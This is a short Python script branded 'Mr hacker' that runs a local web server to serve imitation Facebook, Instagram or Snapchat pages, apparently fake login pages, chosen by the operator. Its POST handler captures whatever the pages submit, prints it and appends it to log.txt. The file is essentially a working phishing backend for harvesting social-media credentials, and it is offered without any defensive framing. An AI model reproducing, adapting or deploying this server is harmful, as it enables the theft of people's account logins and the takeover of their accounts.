from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
from datetime import datetime


print(r'''

                                                                           
                                                                           
                         .......                                           
                     .:=*#%%%%%##++***++==-:.                              
                  .:=#%%%%%@@@@%%%%%%%###%%%%%+:.                          
                .:+%%%%%%%%@@@@@%%###%%####%%@@%*:.                        
              .:+#%%%%%%%%%@@@@@%%#*****##%%%%@@%#+..                      
             .+%%%%#%%%##%%%%@%%%#*+=====+*#%%%%@%%+:.                     
            :+%%%%%%%%%%%%%%%%#*+=-----=====*#%%%@%%#-..                   
          .-#%%%%%%%%####%%%#*=---------=====+*#%@@@%%*:.                  
          -#%%%@%%%%%%%%%%#*+-::::-------======+*#%%%%%%+:..               
          =%%%%%%%%%%%%%#*+-::::::::---------=====*#%%%%%+*+...            
         .+%%%%%%%%%%%#*+-::::::::::-:-----=+***+===+#%%%*=+=..            
         -#%%%%%@@%%%#+-::::::::::-::-----+####***+===*#%*-==-             
         =%%%%%@%%%#*=--:::::::::-:--:::-*##*+=--==++==+##+=--..           
        .+%%%%%%%%*=---::::::::-:::::::-*#*=--===+=======**+--:.           
         =#%%%#*+=--------:::::::::::::=**=-=-==--++=---=====--.           
        .+%%%#+====-----------::::::::-=+=-==-+=+--==---=====--:...        
         :#%%%*=====-----::::::::::::--===-=-:-+=--=------=====-.          
          =#%%#*=====-==--::::::::::----==-=----==--------=====-:.         
          .=#%%#*+=====++******++=--::-----------::::::----====-.          
           .*%%%*+==+*#####**++======-------------::::::----===-...        
            =%%%#*==+*#*+===========-==------===-=====-----=====-.         
            .+%%%#*+=+*+=-===+==::----==-------=--==---=====-====-.        
             .=#%%#*+=++===+-+++--------=---::--=++========---===-.        
               .-#%#*==++=+*+==---------==--::--+++====++==---====.        
               -+++*#*=========----------====-==++====++=----=====-..      
               .:=+=+**===--=---------===++++++++=-==+===----===+*##+:.    
                 ..-==+*+====--:------==+++++++==========----==++=*%#*+:.  
                   ..:-=======--------===+++=+==+======-----===++=-*%#**=:.
                      .-====+==-----===++++**++======-------==+++=--=+****+
                       .:====+=========++***++++===--------==++++----=+****
                         :-====-+++++========++===--------==++++=:::---+***
                          ..:-+#*+=================-----==++*+*=:::::::-+**
                           :+#####*+=======+===========+++++**=:::::::::=+*
                        .-+########*======+++++++=+++++++++++-::::::::::=+*
                    ..-+**########*+-----=+++++++++++++++++=::::::::..::-+*
                  .:+*****###*###**-::-::::-==+++++++++===::::::::....:.-+*

  __  __        _                _             
 |  \/  |      | |              | |            
 | \  / |_ __  | |__   __ _  ___| | _____ _ __ 
 | |\/| | '__| | '_ \ / _` |/ __| |/ / _ \ '__|
 | |  | | |_   | | | | (_| | (__|   <  __/ |   
 |_|  |_|_(_)  |_| |_|\__,_|\___|_|\_\___|_|   
                                               
      Made with Love <3 @gr8vilen
''')









# Global variables to hold choice + options
choice = None
options = {
    '1': '/fb.html',
    '2': '/insta.html',
    '3': '/snap.html'
}

class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        global choice, options
        if self.path == '/':  # root path
            if choice in options:
                self.path = options[choice]  # serve selected file
            else:
                self.path = '/index.html'  # fallback
        return SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            # Parse JSON data
            data = json.loads(post_data.decode('utf-8'))
            
            # Get current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Log to terminal
            print(f"[{timestamp}] Received POST data: {data}")
            
            # Log to file
            with open('log.txt', 'a') as f:
                f.write(f"[{timestamp}] {json.dumps(data)}\n")
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
        
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'error'}).encode())

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CustomHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

def option():
    global choice, options
    print("\nAvailable pages:")
    for key, value in options.items():
        print(f"{key}: {value}")
    
    choice = input("\nEnter your choice (1-3): ").strip()

if __name__ == '__main__':
    option()
    run_server()
